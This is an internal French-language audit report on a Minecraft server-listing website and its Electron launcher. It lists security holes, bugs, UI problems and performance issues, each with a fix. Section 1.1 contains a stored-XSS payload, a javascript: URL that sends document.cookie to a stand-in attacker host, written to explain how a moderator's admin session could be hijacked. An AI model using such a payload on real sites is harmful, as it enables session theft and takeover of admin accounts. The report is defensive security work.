# Audit complet — Omniscient (site + launcher)

Date : 2026-10-10. Effort maximum, 4 audits indépendants en parallèle (code, UI/UX, sécurité, charge), chacun ayant lui-même délégué à plusieurs sous-agents pour une lecture exhaustive. **Lecture seule stricte : aucun fichier n'a été modifié pendant cet audit.** Ce rapport consolide et dédoublonne leurs constats.

> ## ✅ Statut : corrigé (2026-10-10, même nuit)
> Tous les constats ci-dessous ont été corrigés et vérifiés (typecheck site propre, `node --check` propre sur tout le launcher) juste après la rédaction de ce rapport — voir le message de fin de session pour le détail par agent. **Un seul point reste volontairement ouvert : la rotation de `LAUNCHER_API_KEY`**, qui nécessite un vrai déploiement (variable Vercel + nouvelle release du launcher pour remplacer les installeurs déjà publiés) plutôt qu'une simple correction de code. Quelques points de sévérité basse ont été sciemment laissés tels quels avec leur raison documentée (voir mémoire `project_security_audit_findings.md`) : `curseforge/files` toujours non scopé à un serveur visible (rate-limit resserré à la place), messages d'erreur IPC du launcher toujours en français codé en dur (table de correspondance jugée trop fragile), `lib/db.ts` `Row = any` (refactor trop large pour une correction rapide).

## Comment lire ce document

Chaque constat a : sévérité, fichier:ligne, scénario concret, recommandation. Classé par thème puis par sévérité. La section 0 liste les 5 corrections à faire en premier.

---

## 0. Top priorités (à corriger avant tout le reste)

1. **[CRITIQUE·SÉCU]** XSS stocké via `proofUrl` (schéma `javascript:`) → prise de contrôle totale du panel admin en un clic d'un modérateur. §2.1
2. **[CRITIQUE·BUG]** La case "Connexion automatique" (autoConnect) qu'on vient d'ajouter ce soir est cassée — toujours enregistrée `false` en base, quelle que soit la case cochée à l'écran. §3.1
3. **[CRITIQUE·BUG]** Deux téléchargements Java concurrents pour le même major peuvent se corrompre mutuellement (même zip temp, même dossier supprimé par l'autre). §3.2
4. **[CRITIQUE·BUG]** Deux installations de modpack concurrentes pour le même serveur peuvent corrompre un fichier sans que les contrôles d'intégrité le détectent. §3.2
5. **[CRITIQUE·UI]** Panel admin inutilisable sous ~768px (sidebar fixe, KPI qui se chevauchent, texte illisible). §4.1

Haute priorité ensuite : fuite de `LAUNCHER_API_KEY` dans les builds déjà publiés (§2.1), écran de maintenance qui ne bloque jamais réellement personne au démarrage (§3.3), diffusion de notifications en boucle avec risque de double-envoi (§5).

---

## 1. Sécurité

### Critique

**1.1 — XSS stocké via `proofUrl` (schéma `javascript:`)**
- `site/src/app/api/launcher/servers/[slug]/report/route.ts:50` : aucune validation de schéma sur `proofUrl`, juste une troncature à 300 car.
- Stocké tel quel (`lib/reports.ts:126`), puis rendu en `<a href="${escapeHtml(r.proofUrl)}">` dans `site/src/app/admin/design/bind.ts:977` — `escapeHtml()` n'échappe que `& < > "`, pas le schéma d'une URL.
- Ce HTML est injecté via `dangerouslySetInnerHTML` dans `DesignScreen.tsx:125`, donc dans le DOM réel de `/admin/reports`.
- **Scénario** : un joueur connecté (pas besoin d'être propriétaire) envoie un signalement "comportement" avec `proofUrl = "javascript:fetch('https://attaquant.tld/x?c='+document.cookie)"`. Dès qu'un modérateur clique sur "Preuve fournie" dans `/admin/reports`, le JS s'exécute dans le contexte authentifié admin — peut créer un compte admin, geler/transférer/supprimer un serveur, etc.
- **Correctif** : valider le schéma dès la réception (`http:`/`https:` seulement, même logique que `isSafeImageUrl` dans `lib/actions/servers.ts`), et en défense en profondeur dans `bind.ts`, ne poser `href` que si le protocole est sûr.

### Haute

**1.2 — `LAUNCHER_API_KEY` en clair dans les builds launcher déjà publiés**
- `launcher/src/env.generated.js` (généré depuis `.env`) est empaqueté sans exclusion par `package.json` (`build.files`), présent en clair dans `app.asar` des installeurs déjà publiés sur le dépôt GitHub **public** (`nono84250-sudo/omniscient-launcher`).
- Pas de fuite par Git (fichier gitignoré), mais la clé doit être traitée comme déjà potentiellement connue.
- Atténuant : aucune route sensible ne s'appuie sur cette clé seule (l'identité réelle du joueur est toujours revérifiée via jeton Mojang/session signée) — ça aggrave surtout §1.6 et §1.7 ci-dessous.
- **Correctif** : faire tourner la clé (variable Vercel + prochain build).

### Moyenne

**1.3 — `canSeeServer`/`visibleServerIdBySlug` ignorent `published`/`verificationStatus`**
- `site/src/lib/public-servers.ts:213-233` : renvoient vrai dès `!isPrivate`, sans vérifier `published`/`verificationStatus` (contrairement à `getServerWithIpBySlug:238-262` qui le fait).
- Confirmé exploitable sur `api/launcher/servers/[slug]/modpack/route.ts:43` : un serveur moddé public mais pas encore publié/validé peut faire fuiter son modpack CurseForge/Modrinth (et déclenche une écriture DB) à n'importe quel joueur identifié qui devine le slug. Même défaut (sans écriture) sur `launch`/`report`.
- **Correctif** : faire passer `modpack/route.ts` par le même garde que `getServerWithIpBySlug`.

**1.4 — `servers/[slug]/route.ts` : le check "gelé" révèle l'existence d'un serveur privé avant tout contrôle de visibilité**
- `site/src/app/api/launcher/servers/[slug]/route.ts:29-35` : le check `frozenAt` répond 403 pour N'IMPORTE QUEL slug gelé, AVANT `getServerWithIpBySlug` (le vrai contrôle de visibilité).
- Même défaut, pire, sur `site/src/app/api/public/servers/[slug]/route.ts:19-27` : **aucune authentification requise** — n'importe qui sur Internet peut confirmer qu'un serveur privé existe à un slug donné et a été gelé.
- **Correctif** : déplacer le contrôle "gelé" après le contrôle de visibilité.

**1.5 — Pas de révocation de session admin sur changement de mot de passe**
- `lib/adminAuth.ts`/`adminSession.ts` : un changement de rôle/suppression de compte prend effet immédiatement (re-lu à chaque requête), mais un changement de **mot de passe** ne révoque rien — un cookie de session admin volé reste valide jusqu'à 8h même après que l'admin a changé son mot de passe en pensant se protéger.

**1.6 — IPC `settings:set` (launcher) sans liste blanche de clés — `javaPath` non validé**
- `launcher/src/main.js:1084-1088` → `settingsStore.js:86-112` : fusion générique, ne valide pas `javaPath`, consommé ensuite par `spawn()` dans `mcLaunch.js`/`javaManager.js`.
- Non exploitable aujourd'hui (rien côté renderer n'envoie `javaPath`), mais si un futur XSS/dépendance compromise permettait d'exécuter du JS dans le renderer, c'est une primitive d'exécution immédiate.
- **Correctif** : liste blanche de clés acceptées, valider que `javaPath` pointe vers un vrai exécutable.

**1.7 — `curseforge/files` : fileIds non liés à un serveur visible par l'appelant**
- `site/src/app/api/launcher/curseforge/files/route.ts:28-40` : relais générique vers l'API CurseForge pour n'importe quel fileId, consommant le quota de la clé du site (risque de révocation si CurseForge détecte du scraping).

**1.8 — Pas de revalidation DB du verrou de compte joueur côté site web**
- `site/src/auth.ts:40-80` : le JWT NextAuth n'est revérifié contre `user.lockedAt` qu'à la connexion initiale, jamais sur les requêtes suivantes (contrairement à `launcherAuth.ts`). Un compte verrouillé par un admin garde un accès web complet (dashboard, gestion serveurs) tant que son cookie reste valide (jusqu'à 30 jours, pas de `maxAge` explicite).

### Basse

- **1.9** — `credentials`/`sources` (admin) n'utilisent pas `adminForAction` → pas de contrôle d'Origin anti-CSRF (impact limité, cookie `sameSite:strict`).
- **1.10** — Pas de rate limit sur : création de staff, envoi de notifications admin, activation de maintenance admin, vérification du code de maintenance (launcher), `GET /api/public/servers` (seule route "liste" sans frein de tout le périmètre public).
- **1.11** — `adminForAction` fail-open si l'en-tête `Origin` est absent plutôt qu'erroné (devrait être fail-closed).
- **1.12** — `isPrivateIPv6` (ssrfGuard) ne reconnaît pas `::` ni les préfixes de tunnel (NAT64/6to4/Teredo) — gap défense-en-profondeur, pas une brèche en soi (DNS-rebinding déjà couvert ailleurs).

### Zones vérifiées propres (sécurité)
Injection SQL (0 trouvée, tout paramétré), IDOR sur actions serveur/report (toujours filtré par `ownerId`), SSRF (ssrfGuard solide, résistant au DNS-rebinding), validation upload (MIME + taille + signature binaire), zip-slip (protégé), stockage identifiants launcher (`safeStorage`, pas de fallback clair), durcissement Electron (contextIsolation/sandbox partout), redaction des tokens dans les logs, auth/autz admin (32/34 routes via `adminForAction`), auth/autz launcher (identité revérifiée systématiquement).

---

## 2. Bugs — site (Next.js)

### Critique

**2.1 — La case "Connexion automatique" (autoConnect) ne s'enregistre jamais à `true`**
- `site/src/components/ServerForm.tsx:335` et `NewServerWizard.tsx:244` : le champ hidden `autoConnect="false"` est placé AVANT la checkbox dans le DOM. `FormData.get()` renvoie la PREMIÈRE entrée du même nom — donc toujours `"false"`, case cochée ou non.
- `lib/actions/servers.ts:69` évalue donc toujours `autoConnect=false`, écrasant même le défaut SQL `DEFAULT 1` à la création.
- La case reste affichée cochée (state React local), donnant l'illusion que l'option est active — elle ne l'a jamais été en base.
- Compoundé par : `site/src/app/manage/[id]/settings/page.tsx:27-42` — `defaultValues` passé à `ServerForm` n'inclut pas `autoConnect: server.autoConnect`, donc la case affiche toujours `true` au chargement, quelle que soit la vraie valeur.
- **Correctif** : inverser l'ordre DOM (checkbox avant le hidden), ou utiliser des valeurs non-ambiguës distinctes (`"on"`/pas de valeur) — et ajouter `autoConnect: server.autoConnect` aux `defaultValues` de la page Paramètres.

### Majeur

**2.2 — HTML corrompu sur `/admin/servers` dès qu'un serveur a des signalements techniques ouverts**
- `site/src/app/admin/design/bind.ts:204` : le texte littéral `[^>]*` (copié du pattern regex) se retrouve dans la CHAÎNE DE REMPLACEMENT — `String.replace` n'interprète pas les métacaractères regex côté remplacement. Le HTML produit casse l'attribut `style`, la cellule "Open reports" est rendue cassée pour chaque serveur listé ayant ≥1 signalement technique ouvert.

**2.3 — Lien mort "Publier mon serveur" sur la page d'accueil → 404**
- `site/src/app/page.tsx:61` pointe vers `/signup`, route inexistante. Le seul chemin réel est `/login`.

**2.4 — `/dashboard/notifications` affiche toujours "aucune notification"**
- Mockup statique, aucune requête DB, alors qu'un vrai système de notifications existe et fonctionne (launcher). Aucune indication que la page n'est pas branchée.

**2.5 — "Voir la fiche publique" (Paramètres serveur) → 404 pour tout nouveau serveur**
- `ManageActions.tsx:60-88` vérifie `published` mais jamais `isPrivate` (ne reçoit même pas cette prop). Tout nouveau serveur a `published=true` (défaut SQL) ET `isPrivate=true` (forcé à la création) simultanément — le bouton s'affiche mais mène à une 404 garantie.

**2.6 — Statut "en attente de vérification"/"refusé" incohérent entre pages de la même console**
- `/manage/[id]` (Overview) applique la bonne priorité `frozen > pending > rejected > published > paused` ; `/manage/[id]/settings` (`ManageActions.tsx`) et `/dashboard` ne reçoivent/vérifient jamais `verificationStatus` — un serveur "en attente" affiche "Publié" sur ces deux dernières pages.

**2.7 — Overview admin : "Needs attention" affiche des incidents fictifs du mockup malgré un compteur exact à 0 juste au-dessus**
- `bind.ts:98-107` : `replaceOnce` échoue silencieusement sur le `subtitle` (recherche d'une chaîne qui ne correspond pas à la structure HTML réelle), le texte du mockup reste affiché tel quel, sans être marqué "NON BRANCHÉ" contrairement aux 3 graphiques de la même page. Boutons "Review"/"All reports" morts.

**2.8 — Overview admin "Open reports" et "Needs attention" portent sur un jeu de données différent du badge "Reports" du menu**
- Overview compte les signalements **techniques** (gérés par le propriétaire, pas par l'admin), le badge du menu et `/admin/reports` comptent les signalements **comportement**. Un admin voit un chiffre et une liste non actionnable à sa place.

**2.9 — `AdminSourceToggles` (interrupteurs CurseForge/Modrinth) : composant fonctionnel mais jamais rendu nulle part**
- API fonctionnelle (`/api/admin/sources`), composant jamais importé — aucun admin ne peut couper une source de modpacks depuis l'UI.

**2.10 — Modale "Modifier le rôle" (Administration) infermable par Échap/clic extérieur**
- Bouton "Fermer" existe mais caché en bas d'une longue matrice de permissions elle-même non fonctionnelle.

**2.11 — Redirection post-connexion Microsoft toujours vers `/dashboard`**
- `signInWithMicrosoft()` (`lib/actions/auth.ts:10-11`) : `redirectTo:"/dashboard"` en dur. Le `?from=` calculé par le middleware (`proxy.ts`) n'est lu nulle part — `/login` ne lit même pas `searchParams`. Un joueur invité à se connecter depuis `/manage/xxx/settings` atterrit sur le dashboard générique après connexion.

**2.12 — `/admin/parametres` : page orpheline (aucun lien n'y mène) et visuellement cassée**
- Cause racine : la sidebar admin n'est pas un vrai layout partagé (`(panel)/layout.tsx` est un simple passe-plat), elle est dupliquée dans le HTML de chaque maquette liée. Toute page hors de ce pipeline (parametres, login, premiere-connexion) se retrouve sans navigation, avec des couleurs en dur différentes des vrais tokens.

**2.13 — Mélange systématique FR/EN dans tout le panel admin**
- Cause racine : le panel admin n'utilise **jamais** le système i18n du site (0 occurrence de `useI18n()`/`getT()` dans `src/app/admin/**`, vérifié par grep exhaustif) — la maquette source est en anglais, seules les données ciblées par `bind.ts` sont remplacées. Tant que ce pipeline (maquette brute + remplacements ciblés) reste en place, chaque nouvel écran reproduira ce mélange.

**2.14 — Diffusion de notifications en boucle séquentielle (risque de double-envoi)**
- `lib/notifications.ts:69-86` (`broadcastNotification`) : un aller-retour D1 par destinataire, boucle `for` séquentielle — exactement le piège déjà corrigé pour `markNotificationsRead`/`deleteReadNotifications` (commentaire explicite dans le même fichier), mais pas reporté ici. 3 points d'appel, dont le cron de diffusions programmées (`scheduledBroadcasts.ts:67-82`) qui ne marque `sentAt` qu'**après** la boucle complète — un timeout/erreur en cours de boucle fait retomber l'item en "due" au tick suivant → **re-notification en double** de destinataires déjà servis.
- Projection : ~300 destinataires ≈ 30s, risque réel de timeout de fonction serverless.

### Moyen / mineur (site)

- **2.15** — `lib/db.ts:9` : `type Row = any` — toute lecture DB non typée, les `as Enum`/accès de propriété ne sont que décoratifs. Rien ne garantit qu'une future colonne renommée ou un enum étendu côté SQL soit détecté à la compilation.
- **2.16** — `types/next-auth.d.ts` garantit `session.user.id: string`, mais le callback ne l'assigne que conditionnellement — peut rester `undefined` à l'exécution si l'échange Xbox échoue, provoquant des résultats DB vides silencieux (`ownerId = NULL`) plutôt qu'une erreur claire.
- **2.17** — `status-snapshot.ts:19` ne filtre pas `verificationStatus` (contrairement à `loadPublishedServers`) — un serveur public en attente/rejeté fuit son statut en ligne + nombre de joueurs via `/api/launcher/status`.
- **2.18** — Pas de timeout sur les fetch CurseForge/Modrinth (`curseforge.ts`, `modrinth.ts`) — contrairement à `xboxAuth.ts`/`mc-ping.ts`/`minecraft-versions.ts` qui en ont.
- **2.19** — `toggleServerPublished`/`markReportResolved` renvoient silencieusement sans erreur quand l'action est rejetée (serveur gelé) — le propriétaire ne voit ni confirmation ni explication.
- **2.20** — Cycle privé→public(rejeté)→privé→public : `verificationReason` (ancien motif de rejet) n'est jamais vidé, l'admin voit un motif obsolète à côté d'un statut "en attente" tout neuf.
- **2.21** — Race condition "dernier administrateur" (TOCTOU) sur rétrogradation/suppression de compte staff — deux requêtes concurrentes peuvent laisser 0 administrateur (pas de transaction D1-REST).
- **2.22** — `interpolate()` (i18n launcher) utilise `String.replace` non-global — un placeholder dupliqué dans une traduction ne serait remplacé qu'une fois (latent, aucune chaîne actuelle n'est concernée) ; un `$` dans une valeur interpolée serait interprété comme motif spécial de `replace`.
- **2.23** — Formulaires admin (connexion staff, changement d'identifiants) : champs sans label ni aria-label, seul le placeholder identifie le champ.
- **2.24** — 3 palettes sombres concurrentes (`globals.css`, `nocturne.css` sans thème clair du tout, 4 pages en couleurs inline `#0f1119`) + composants d'auth admin qui recodent encore d'autres variantes à la main.
- **2.25** — Couleurs en dur qui cassent réellement le thème clair : `SiteBanner.tsx` (bandeau "alert" reste rouge sombre), `manage/[id]/reports/page.tsx` (reprend la valeur sombre de `--warn`).
- **2.26** — Code mort confirmé : route `/api/launcher/status` + `status-snapshot.ts` (jamais appelés), `RadioDot` (NewServerWizard), `AdminLogoutButton`, fonction `sleep` (launcher main.js).
- **2.27** — Clé i18n `serviceStatus.refresh` utilisée (launcher) mais absente des deux dictionnaires — affiche littéralement la clé comme `title`/`aria-label`.
- **2.28** — Plusieurs clés i18n mortes (launcher) : reliquats d'anciennes UI de connexion/modale RAM.

### Zones vérifiées propres (code site)
`BOOLEAN_COLUMNS` cohérent avec le schéma, pas de N+1 sur les relations (`attachIncludes` bien groupé), contrats d'API launcher↔site tous cohérents champ par champ, `ssrfGuard`/zip-slip/upload propres, `params`/`searchParams` toujours `await`-és, 0 `as any`/`@ts-ignore` (sauf 1 cas mineur documenté), i18n FR/EN structurellement identique (277 clés, aucun placeholder désynchronisé), timing-safe comparisons là où il faut.

---

## 3. Bugs — launcher (Electron)

### Critique

**3.1 — Course entre deux téléchargements Java concurrents pour le même major**
- `launcher/src/javaManager.js:116-164` : `tmpZip`/`destDir` dépendent uniquement du major Java. Deux clics "Jouer" rapprochés sur deux serveurs nécessitant le même Java (ex. 21) lancent deux téléchargements qui écrivent dans le même fichier temp et font chacun `rmSync` sur le même dossier — peut supprimer l'extraction de l'autre ou corrompre le zip. Aucun verrou/mutex par major.

**3.2 — Course entre deux installations de modpack concurrentes pour le même serveur**
- `launcher/src/modpack.js:82-111,297-327` : deux installations du même slug (double-clic, "Jouer"+"Réinstaller") écrivent vers le même `.part` — écritures entremêlées au niveau OS, mais le SHA-1/compteur sont calculés en mémoire à partir des seuls octets écrits par CE process, jamais relus depuis le disque : chaque process peut croire son hash valide alors que le fichier final est corrompu.
- **Correctif commun 3.1/3.2** : verrou keyed (par major / par slug) autour de ces opérations.

### Majeur

**3.3 — L'écran de maintenance ne bloque jamais réellement personne au démarrage**
- `main.js:645-666` (`maintenance:check`/`verifyCode`) appellent `launcherAuthHeaders()`, qui déréférence `currentSession.authorization` sans vérifier que `currentSession` existe (`null` avant toute connexion). Au tout premier démarrage — exactement le moment où on veut bloquer avant l'écran de connexion — ça lève une `TypeError` avalée par le catch, qui renvoie `{active:false}` quel que soit l'état réel. Fail-open silencieux.
- **Correctif** : ces deux appels n'ont besoin que de la clé API (comme `joinServerByCode`), pas de `launcherAuthHeaders()`.

**3.4 — Pas de verrou mono-instance (`app.requestSingleInstanceLock()` absent)**
- Relancer le launcher pendant qu'une instance tourne crée un second process totalement indépendant : deux lancements Minecraft simultanés possibles sur le même `GAME_ROOT`, écritures concurrentes sans verrou sur `settings.json`/`accounts.bin` (dernier écrivain gagne), double enregistrement du raccourci global debug.

**3.5 — `app.whenReady().then(async () => {...})` sans `.catch()`**
- Si `createWindow()`/`setContentSecurityPolicy()`/`discordPresence.init()` lève une exception inattendue au démarrage, rien n'est loggé ni affiché — le launcher reste figé/invisible sans aucune trace exploitable.

**3.6 — `account:switch` : échec de persistance rapporté comme échec total alors que le compte a déjà basculé**
- `main.js:943-965` : `rememberAccount()` n'a pas son propre try/catch ; si l'écriture `accounts.bin` échoue APRÈS que `currentSession` a déjà changé, l'erreur tombe dans le catch générique qui dit "impossible de basculer" — alors que tous les appels suivants agissent déjà sous le nouveau compte. Comparer avec `auth:signIn`/`auth:tryRestore` qui gèrent déjà ce cas correctement.

**3.7 — Écritures non atomiques + fallback silencieux sur corruption (`settingsStore.js`, `sessionStore.js`)**
- `fs.writeFileSync` direct (pas de fichier temp + rename). Process tué pendant l'écriture → fichier tronqué → au redémarrage, erreur de parse avalée silencieusement → repart sur des valeurs vides. Pour les comptes multi-comptes mémorisés, le PROCHAIN "se souvenir de moi" réussi réécrit `accounts.bin` depuis un état vide, **effaçant définitivement les autres comptes enregistrés**, sans trace.

**3.8 — Timeouts réseau/process manquants dans `javaManager.js`, `mcPing.js`, `modpack.js`**
- `detectJava` (spawn java -version), `fetchLatestJreInfo`, téléchargement JRE, `extractZip` (powershell) : aucun timeout. Un binaire Java qui ne se termine jamais bloque tout le pipeline de lancement sans message.
- `mcPing.js:29-37` (`resolveSrvTarget`) : aucun timeout sur la résolution DNS SRV — `PING_TIMEOUT_MS=3000` ne protège que la connexion TCP qui suit, pas cette étape (utilisé par le check #1 de l'auto-test de publication, qui documente pourtant "ne lève jamais").
- `modpack.js` : `siteJson`, `downloadFile`, `ensureVanillaVersion`, `installFabric` — aucun AbortController.

**3.9 — `res.json()` non protégé sur 5 appels réseau dans `msAuth.js`**
- Un proxy d'entreprise/portail captif qui renvoie du HTML plutôt que du JSON fait planter avec une `SyntaxError` brute au lieu d'un message clair — le correctif (`.catch(() => ({}))`) existe déjà ailleurs dans `modpack.js`.

**3.10 — Filtrage des règles JVM Mojang dupliqué et divergent entre `mcLaunch.js` et `modpack.js`**
- `mcLaunch.js:19-20` ignore l'architecture (`r.os.arch`) contrairement à `modpack.js:489-498` qui la vérifie correctement — un argument JVM ciblant spécifiquement une autre architecture pourrait être appliqué à tort sur un lancement vanilla.

**3.11 — `discordPresence.js` : instances `Client` obsolètes qui continuent à muter l'état partagé**
- `connect()` réaffecte la variable module sans `.destroy()` sur l'ancienne instance ; un ancien client qui échoue tardivement peut écraser l'état d'un client plus récent pourtant bien connecté, provoquant des reconnexions en boucle inutiles.

**3.12 — Suppression des anciens fichiers de modpack avant confirmation du téléchargement des nouveaux**
- `modpack.js:297-327` : si un mod échoue après ses tentatives, les anciens fichiers sont déjà supprimés mais l'état sur disque reste celui de l'ancienne version — l'instance reste incomplète jusqu'à une réinstallation réussie.

**3.13 — Double-soumission possible de "Jouer"/"Rejoindre" depuis 3 points d'entrée sur 4**
- `renderer.js:686-692` : le garde-fou `launchInProgress` est vérifié AVANT un `await` (résolution RAM recommandée, potentiellement une modale bloquante) et n'est posé qu'après. Seul le bouton "Rejoindre" de la fiche détail se protège correctement (désactivation synchrone) ; playbar, carte "Continuer" et "Mes instances"/"Rejoint" sont exposés à un double-clic rapide.

**3.14 — Messages d'erreur IPC du launcher jamais traduits**
- `main.js` renvoie des messages d'erreur en français codé en dur (≥14 confirmés), affichés tels quels côté renderer sans passer par `t()` — un joueur avec `locale="en"` les voit quand même en français.

**3.15 — Deux rouges "danger" différents dans le launcher**
- Token `--danger` vs `"#e5484d"` codé en dur à 4 endroits (statut hors-ligne, 3 types de notifications) — teintes visiblement différentes pouvant apparaître dans la même session.

**3.16 — Pendant tout écran modal bloquant (maintenance, auto-test), les boutons de la barre de titre sont désactivés par héritage CSS**
- `pointer-events:none` sur un parent commun (`body.modal-blocking`) coupe aussi minimiser/fermer — pas seulement pendant la maintenance mais aussi pendant les 10 minutes du nouveau check de connexion de l'auto-test.

### Mineur (launcher)
- Fuite potentielle de listeners : `preload.js` (`onConnectionProgress`/`onGameState`) sans fonction de désabonnement (sans impact actuel, renderer.js ne les appelle qu'une fois).
- `extractOverrides` (modpack.js) perd sa base de comparaison si l'état précédent est vide — un fichier ne sera plus jamais mis à jour automatiquement, contredisant le commentaire du code.
- Pas de verrou entre deux `addServerToList` concurrents (`serversDat.js`) — perte silencieuse d'une entrée de la liste Multijoueur.
- Rigueur d'assainissement d'URL incohérente entre chargeurs de mods (Fabric encode, Forge/NeoForge non) avant interpolation Maven.
- Intégrité dégradée à "taille seule" quand `sha1` est absent (CurseForge sans hash, Modrinth sans hash).
- Pas de paramètre `state` anti-CSRF dans l'URL d'autorisation OAuth Microsoft (risque atténué par l'architecture BrowserWindow + PKCE).
- Commentaire obsolète : "Fabric/Quilt non gérés" — Fabric l'est, seul Quilt ne l'est pas.
- Listes de serveurs (launcher) non accessibles au clavier (`<div>` cliqué sans `role="button"`/`tabindex`).
- `escapeHtml` oublié à 2 endroits isolés (pseudo du joueur sur l'accueil ; RAM recommandée en fiche détail) — non exploitable en pratique vu les contraintes de ces champs, mais incohérent.
- "DEBUG TEMPORAIRE" toujours présent dans `servers:mine` (4 lignes de log à chaque appel) — le "diagnostic à retirer" du commit `ef6eff0`.
- Commentaires trompeurs sur la durée de session launcher ("24h"/"5 min avant expiration" en commentaire, 15 min / 30s en réalité dans le code).

### Zones vérifiées propres (launcher)
Sécurité Electron (contextIsolation/sandbox partout), `safeStorage` toujours vérifié avant usage, cohérence IPC main↔preload (52 handlers, tous appariés), parsing binaire `serversDat.js` (MUTF-8, bornes, pas de boucle infinie), zip-slip protégé, checksum JRE vérifié avant extraction, aucun bouton HTML mort trouvé.

---

## 4. UI/UX

### Critique

**4.1 — Panel admin inutilisable sous ~768px**
- Sidebar qui ne se réduit jamais, tuiles KPI qui se chevauchent en texte illisible (confirmé par capture d'écran à 375px). Aucune adaptation mobile (pas de sidebar escamotable, pas de réagencement).

### Majeur
(Récapitulatif — détail complet dans les constats 2.7 à 2.13 ci-dessus, qui sont à la fois des bugs et des problèmes UX) : incidents fictifs sur Overview, modale de rôle infermable, redirection post-connexion fixe, formulaires admin sans label, page Paramètres orpheline/cassée, mélange FR/EN systémique, boutons de fenêtre désactivés pendant les écrans bloquants du launcher.

### Modéré / mineur
- Écarts fonctionnels vs maquettes : personnalisation des couleurs du graphique d'activité absente, catégorisation/regroupement des signalements absent, choix Public/Privé retiré de l'assistant de création (intentionnel et documenté).
- Contraste borderline (WCAG ~4.0-4.7:1) du tag Vanilla/Moddé sur bannière placeholder à motif.
- Affordance incohérente : lignes Vérification (Validés/Refusés) qui ont l'air cliquables mais ne le sont que par leur lien texte.
- Trois verbes différents pour "lancer le jeu" dans le launcher (Jouer / Rejoindre / Lancer avec X Go).
- `window.confirm()` natif à 2 endroits (launcher, réinitialisation code d'invitation) qui détonne avec le reste de l'UI custom.
- "serveur" (site) vs "instance" (launcher) pour la même entité — incohérence lexicale, difficile à unifier sans renommer l'un des deux.

### Positif à noter
Dashboard/assistant de création/formulaire d'édition très soignés (bien plus que l'admin) : i18n systématique, gestion fine des cas limites, confirmations destructives bien faites ("tape le nom du serveur"). Responsive et accessibilité clavier/focus bons côté site public. Convention "NON BRANCHÉ" pour les sections pas finies côté admin — bonne pratique, juste appliquée de façon incomplète. Page `/admin/packs` : la plus aboutie du panel admin, bon modèle à suivre pour le reste.

---

## 5. Performance / scalabilité

**Contexte architectural important** : D1 est accédé via l'API REST Cloudflare (pas un binding Workers) — chaque opération ORM est un aller-retour HTTP séparé (~90-110ms mesuré depuis cette machine). Le coût dominant n'est plus "la requête SQL est-elle efficace" mais "combien d'allers-retours réseau séquentiels un appel déclenche-t-il". Une seule base D1 existe actuellement (dev/test uniquement — **aucune base de prod séparée n'existe encore**, à provisionner avant de fusionner `d1-migration`).

### Haute sévérité
- **`broadcastNotification`** (voir §2.14) : seul chemin qui scale mal avec le nombre de joueurs, et tourne aussi par cron avec risque de double-envoi.

### Moyenne
- Chemin "obtenir l'IP d'un serveur" (lancement de jeu, launcher) : 1 aller-retour redondant qui pourrait être fusionné — payé à chaque lancement, pour tous les joueurs (~25% de gain estimé sur cette route).
- `/admin/verification` : triple appel `.all()` non borné (2 des 3 ne servent qu'à un compteur, un helper `COUNT(*)` existe déjà mais n'est pas réutilisé).
- Fiche joueur admin : charge tous les signalements techniques de toute la plateforme, recoupés en mémoire au lieu d'un `WHERE serverId IN (...)`.
- `getT()`/`getCurrentAdmin()` appelés en boucle sans mémoïsation (`React.cache()`) — jusqu'à ~28 appels indépendants à `cookies()` sur une seule page `/servers` ; c'est aussi la cause racine qui force tout l'arbre de rendu en dynamique (le `revalidate=60` déclaré n'a donc aucun effet sur le HTML, seules les données le sont via cache séparé).

### Confirmé : les correctifs du 2026-09-27 tiennent toujours
Cache par tag, pagination, rate limiting, compteurs atomiques sous charge (testé : 20 requêtes concurrentes → delta exact +20) — tous vérifiés présents et non contournés par le code ajouté depuis.

### Mesures (dev vs build de production, pour référence)
Les routes publiques HTML/JSON sont 7 à 10× plus rapides en build de prod qu'en dev (`next dev` n'est pas représentatif). Les routes launcher authentifiées, elles, ne bougent presque pas entre dev et prod : leur coût est dominé par les vrais allers-retours D1-REST, incompressible par un meilleur build.

---

## Annexe — zones vérifiées propres, toutes catégories confondues

Pour éviter de re-chercher inutilement plus tard : injection SQL (0 occurrence), typage contourné (`as any`/`@ts-ignore`, 0 dans l'API, 1 cas mineur ailleurs), `params`/`searchParams` toujours `await`-és, IDOR sur actions serveur/report/admin, SSRF, zip-slip, upload (MIME+taille+signature), stockage des identifiants launcher, durcissement Electron, redaction des tokens, contrats d'API launcher↔site (tous cohérents champ par champ), N+1 sur les relations D1 (aucun — `attachIncludes` bien groupé), rate limiting (16/19 routes launcher+public), i18n structurel du site (277 clés FR/EN identiques), protection "dernier administrateur" (double défense UI+serveur), gel de serveur (cohérent partout), Promise.all généralisé dans le panel admin.
